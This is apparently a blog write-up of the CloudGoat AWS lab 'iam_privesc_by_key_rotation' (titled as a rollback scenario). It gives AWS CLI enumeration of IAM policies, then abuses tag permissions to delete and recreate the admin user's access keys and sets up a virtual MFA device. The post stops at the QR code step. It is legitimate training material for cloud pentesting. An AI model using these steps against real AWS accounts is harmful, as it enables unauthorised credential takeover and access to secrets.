---
layout: post
title: AWS Pentest with CloudGoat (iam_privesc_by_rollback)
categories: Cloud
---

## Setup target enviroment
Using CloudGaot, we can set up the target environment. 
```shell
kali@kali:~/cloudgoat$ ./cloudgoat.py create iam_privesc_by_key_rotation
Using default profile "default" from config.yml...
Loading whitelist.txt...
A whitelist.txt file was found that contains at least one valid IP address or range.
Initializing the backend...
Initializing provider plugins...
- Finding hashicorp/aws versions matching ">= 5.0.0"...
- Installing hashicorp/aws v5.73.0...
- Installed hashicorp/aws v5.73.0 (signed by HashiCorp)
Terraform has created a lock file .terraform.lock.hcl to record the provider
selections it made above. Include this file in your version control repository
so that Terraform can guarantee to make the same selections by default when
you run "terraform init" in the future.

Terraform has been successfully initialized!

---snip---

[cloudgoat] terraform output completed with no error code.
cloudgoat_output_aws_account_id = 096165652555
cloudgoat_output_kerrigan_access_key_id = AKI{MASK}
cloudgoat_output_kerrigan_secret_key = JKH{MASK}

[cloudgoat] Output file written to:

    /home/kali/cloudgoat/iam_privesc_by_key_rotation_cgidw2u3gv7ff3/start.txt

kali@kali:~/cloudgoat$
```

## Setup AWS CLI
```shell
kali@kali:~/cloudgoat$ aws configure --profile manager  
AWS Access Key ID [None]: AKI{MASK}
AWS Secret Access Key [None]: JKH{MASK}
Default region name [None]: 
Default output format [None]: 
                                                                                                                                          kali@kali:~/cloudgoat$
```

## Check if AWS CLI is configured properly
```shell
kali@kali:~/cloudgoat$ aws iam get-user --profile manager                                                                                                                            
{
    "User": {
        "Path": "/",
        "UserName": "manager_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
        "UserId": "AIDARMY7LNBFV6WO57UXQ",
        "Arn": "arn:aws:iam::096165652555:user/manager_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
        "CreateDate": "2024-10-30T06:21:10+00:00",
        "Tags": [
            {
                "Key": "Scenario",
                "Value": "iam_privesc_by_key_rotation"
            },
            {
                "Key": "Stack",
                "Value": "CloudGoat"
            }
        ]
    }
}
                                                                                                                                          kali@kali:~/cloudgoat$
```

## 
```shell
kali@kali:~/cloudgoat$ aws iam list-users
{
    "Users": [
        {
            "Path": "/",
            "UserName": "admin_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
            "UserId": "AIDARMY7LNBFSPI6AMX7I",
            "Arn": "arn:aws:iam::096165652555:user/admin_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
            "CreateDate": "2024-10-30T06:21:10+00:00"
        },
        {
            "Path": "/",
            "UserName": "CloudGoat",
            "UserId": "AIDARMY7LNBF2BDO326TP",
            "Arn": "arn:aws:iam::096165652555:user/CloudGoat",
            "CreateDate": "2024-10-17T00:46:41+00:00"
        },
        {
            "Path": "/",
            "UserName": "developer_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
            "UserId": "AIDARMY7LNBF77TW7RFAB",
            "Arn": "arn:aws:iam::096165652555:user/developer_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
            "CreateDate": "2024-10-30T06:21:10+00:00"
        },
        {
            "Path": "/",
            "UserName": "manager_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
            "UserId": "AIDARMY7LNBFV6WO57UXQ",
            "Arn": "arn:aws:iam::096165652555:user/manager_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
            "CreateDate": "2024-10-30T06:21:10+00:00"
        }
    ]
}
                                                                                                                                          kali@kali:~/cloudgoat$ 
```

##
```shell
aws iam list-attached-user-policies --user-name manager_iam_privesc_by_key_rotation_cgidw2u3gv7ff3 
{
    "AttachedPolicies": [
        {
            "PolicyName": "IAMReadOnlyAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/IAMReadOnlyAccess"
        }
    ]
}
                                                                                                                                          kali@kali:~/cloudgoat$
```

##
```shell
kali@kali:~/cloudgoat$ aws iam list-user-policies --user-name manager_iam_privesc_by_key_rotation_cgidw2u3gv7ff3
{
    "PolicyNames": [
        "SelfManageAccess",
        "TagResources"
    ]
}
                                                                                                                                          kali@kali:~/cloudgoat$
```

##
```shell
kali@kali:~/cloudgoat$ aws iam get-user-policy --user-name manager_iam_privesc_by_key_rotation_cgidw2u3gv7ff3 --policy-name SelfManageAccess
{
    "UserName": "manager_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
    "PolicyName": "SelfManageAccess",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "iam:DeactivateMFADevice",
                    "iam:GetMFADevice",
                    "iam:EnableMFADevice",
                    "iam:ResyncMFADevice",
                    "iam:DeleteAccessKey",
                    "iam:UpdateAccessKey",
                    "iam:CreateAccessKey"
                ],
                "Condition": {
                    "StringEquals": {
                        "aws:ResourceTag/developer": "true"
                    }
                },
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:iam::096165652555:user/*",
                    "arn:aws:iam::096165652555:mfa/*"
                ],
                "Sid": "SelfManageAccess"
            },
            {
                "Action": [
                    "iam:DeleteVirtualMFADevice",
                    "iam:CreateVirtualMFADevice"
                ],
                "Effect": "Allow",
                "Resource": "arn:aws:iam::096165652555:mfa/*",
                "Sid": "CreateMFA"
            }
        ]
    }
}
                                                                                                                                          kali@kali:~/cloudgoat$
```

##
```shell
kali@kali:~/cloudgoat$ aws iam get-user-policy --user-name manager_iam_privesc_by_key_rotation_cgidw2u3gv7ff3 --policy-name TagResources    
{
    "UserName": "manager_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
    "PolicyName": "TagResources",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "iam:UntagUser",
                    "iam:UntagRole",
                    "iam:TagRole",
                    "iam:UntagMFADevice",
                    "iam:UntagPolicy",
                    "iam:TagMFADevice",
                    "iam:TagPolicy",
                    "iam:TagUser"
                ],
                "Effect": "Allow",
                "Resource": "*",
                "Sid": "TagResources"
            }
        ]
    }
}
                                                                                                                                          kali@kali:~/cloudgoat$
```

## Enumeration for the `developer` user
#### Checking the attached 
```shell
kali@kali:~/cloudgoat$ aws iam list-attached-user-policies --user-name developer_iam_privesc_by_key_rotation_cgidw2u3gv7ff3
{
    "AttachedPolicies": []
}
                                                                                                                                        
kali@kali:~/cloudgoat$
```

####
```shell
kali@kali:~/cloudgoat$ aws iam list-user-policies --user-name developer_iam_privesc_by_key_rotation_cgidw2u3gv7ff3
{
    "PolicyNames": [
        "DeveloperViewSecrets"
    ]
}

kali@kali:~/cloudgoat$
```

####
```shell
kali@kali:~/cloudgoat$ aws iam get-user-policy --user-name developer_iam_privesc_by_key_rotation_cgidw2u3gv7ff3 --policy-name DeveloperViewSecrets
{
    "UserName": "developer_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
    "PolicyName": "DeveloperViewSecrets",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": "secretsmanager:ListSecrets",
                "Effect": "Allow",
                "Resource": "*",
                "Sid": "ViewSecrets"
            }
        ]
    }
}
                                                                                                                                          kali@kali:~/cloudgoat$
```

## Enumeration for the `admin` user
####
```shell
kali@kali:~/cloudgoat$ aws iam list-attached-user-policies --user-name admin_iam_privesc_by_key_rotation_cgidw2u3gv7ff3  
{
    "AttachedPolicies": [
        {
            "PolicyName": "IAMReadOnlyAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/IAMReadOnlyAccess"
        }
    ]
}

kali@kali:~/cloudgoat$ 
```

####
```shell
kali@kali:~/cloudgoat$ aws iam list-user-policies --user-name admin_iam_privesc_by_key_rotation_cgidw2u3gv7ff3    
{
    "PolicyNames": [
        "AssumeRoles"
    ]
}
                                                                                                                                          kali@kali:~/cloudgoat$
```

####
```shell
kali@kali:~/cloudgoat$ aws iam get-user-policy --user-name admin_iam_privesc_by_key_rotation_cgidw2u3gv7ff3 --policy-name AssumeRoles
{
    "UserName": "admin_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
    "PolicyName": "AssumeRoles",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": "sts:AssumeRole",
                "Effect": "Allow",
                "Resource": "arn:aws:iam::096165652555:role/cg_secretsmanager_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
                "Sid": "AssumeRole"
            }
        ]
    }
}
                                                                                                                                          kali@kali:~/cloudgoat$ 
```

## Enumeration for `secretmanager` role found in the previous command.
####
Since we found an interesting permission `sts:assumeRole`, a
```shell
kali@kali:~/cloudgoat$ aws iam get-role --role-name cg_secretsmanager_iam_privesc_by_key_rotation_cgidw2u3gv7ff3  
{
    "Role": {
        "Path": "/",
        "RoleName": "cg_secretsmanager_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
        "RoleId": "AROARMY7LNBF5XSLUPP24",
        "Arn": "arn:aws:iam::096165652555:role/cg_secretsmanager_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
        "CreateDate": "2024-10-30T06:21:13+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "",
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "arn:aws:iam::096165652555:root"
                    },
                    "Action": "sts:AssumeRole",
                    "Condition": {
                        "Bool": {
                            "aws:MultiFactorAuthPresent": "true"
                        }
                    }
                }
            ]
        },
        "Description": "Access to view secrets",
        "MaxSessionDuration": 3600,
        "Tags": [
            {
                "Key": "Scenario",
                "Value": "iam_privesc_by_key_rotation"
            },
            {
                "Key": "Stack",
                "Value": "CloudGoat"
            }
        ],
        "RoleLastUsed": {}
    }
}

kali@kali:~/cloudgoat$
```

##
```shell
kali@kali:~/cloudgoat$ aws iam list-role-policies --role-name cg_secretsmanager_iam_privesc_by_key_rotation_cgidw2u3gv7ff3
{
    "PolicyNames": []
}

kali@kali:~/cloudgoat$
```

##
```shell
kali@kali:~/cloudgoat$ aws iam list-attached-role-policies --role-name cg_secretsmanager_iam_privesc_by_key_rotation_cgidw2u3gv7ff3
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg_view_secrets_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
            "PolicyArn": "arn:aws:iam::096165652555:policy/cg_view_secrets_iam_privesc_by_key_rotation_cgidw2u3gv7ff3"
        }
    ]
}

kali@kali:~/cloudgoat$
```

## Checkinng the policy `cg_view_secrets_iam_privesc_by_key_rotation_cgidw2u3gv7ff3`
####
```shell
kali@kali:~/cloudgoat$ aws iam get-policy --policy-arn arn:aws:iam::096165652555:policy/cg_view_secrets_iam_privesc_by_key_rotation_cgidw2u3gv7ff3              
{
    "Policy": {
        "PolicyName": "cg_view_secrets_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
        "PolicyId": "ANPARMY7LNBFSNLPTOTVK",
        "Arn": "arn:aws:iam::096165652555:policy/cg_view_secrets_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "View and retreive secrets",
        "CreateDate": "2024-10-30T06:21:12+00:00",
        "UpdateDate": "2024-10-30T06:21:12+00:00",
        "Tags": [
            {
                "Key": "Scenario",
                "Value": "iam_privesc_by_key_rotation"
            },
            {
                "Key": "Stack",
                "Value": "CloudGoat"
            }
        ]
    }
}

kali@kali:~/cloudgoat$
```

####
```shell
kali@kali:~/cloudgoat$ aws iam get-policy-version --policy-arn arn:aws:iam::096165652555:policy/cg_view_secrets_iam_privesc_by_key_rotation_cgidw2u3gv7ff3 --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": "secretsmanager:ListSecrets",
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": "secretsmanager:GetSecretValue",
                    "Effect": "Allow",
                    "Resource": "arn:aws:secretsmanager:us-east-1:096165652555:secret:cg_secret_iam_privesc_by_key_rotation_cgidw2u3gv7ff3-zGW2cP"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2024-10-30T06:21:12+00:00"
    }
}

kali@kali:~/cloudgoat$
```

## Exploitation of the permission
####
```shell
kali@kali:~/cloudgoat$ aws iam tag-user --user-name admin_iam_privesc_by_key_rotation_cgidw2u3gv7ff3 --tags '{"Key":"developer","Value":"true"}'

kali@kali:~/cloudgoat$
```

####
```shell
kali@kali:~/cloudgoat$ aws iam list-access-keys --user-name admin_iam_privesc_by_key_rotation_cgidw2u3gv7ff3
{
    "AccessKeyMetadata": [
        {
            "UserName": "admin_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
            "AccessKeyId": "AKIARMY7LNBFQAPORQNA",
            "Status": "Inactive",
            "CreateDate": "2024-10-30T06:21:11+00:00"
        },
        {
            "UserName": "admin_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
            "AccessKeyId": "AKIARMY7LNBF6STFEKNL",
            "Status": "Inactive",
            "CreateDate": "2024-10-30T06:21:11+00:00"
        }
    ]
}

kali@kali:~/cloudgoat$
```

##
```shell
kali@kali:~/cloudgoat$ aws iam delete-access-key --user-name admin_iam_privesc_by_key_rotation_cgidw2u3gv7ff3 --access-key-id AKIARMY7LNBFQAPORQNA

kali@kali:~/cloudgoat$ aws iam delete-access-key --user-name admin_iam_privesc_by_key_rotation_cgidw2u3gv7ff3 --access-key-id AKIARMY7LNBF6STFEKNL

kali@kali:~/cloudgoat$ aws iam create-access-key --user-name admin_iam_privesc_by_key_rotation_cgidw2u3gv7ff3
{
    "AccessKey": {
        "UserName": "admin_iam_privesc_by_key_rotation_cgidw2u3gv7ff3",
        "AccessKeyId": "AKI{MASK}",
        "Status": "Active",
        "SecretAccessKey": "qIt{MASK}",
        "CreateDate": "2024-10-30T08:22:59+00:00"
    }
}

kali@kali:~/cloudgoat$
```

##
```shell
kali@kali:~/cloudgoat$ aws iam create-virtual-mfa-device --virtual-mfa-device-name cloudgoat_virtual_mfa --outfile QRCode.png --bootstrap-method QRCodePNG
{
    "VirtualMFADevice": {
        "SerialNumber": "arn:aws:iam::096165652555:mfa/cloudgoat_virtual_mfa"
    }
}

kali@kali:~/cloudgoat$ 
```

The above command creates the following QR Code.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2024-10-31/QRCode.png)

To use this URL, we need to scan it using any XXX like [Aegis Authenticator](https://play.google.com/store/apps/details?id=com.beemdevelopment.aegis).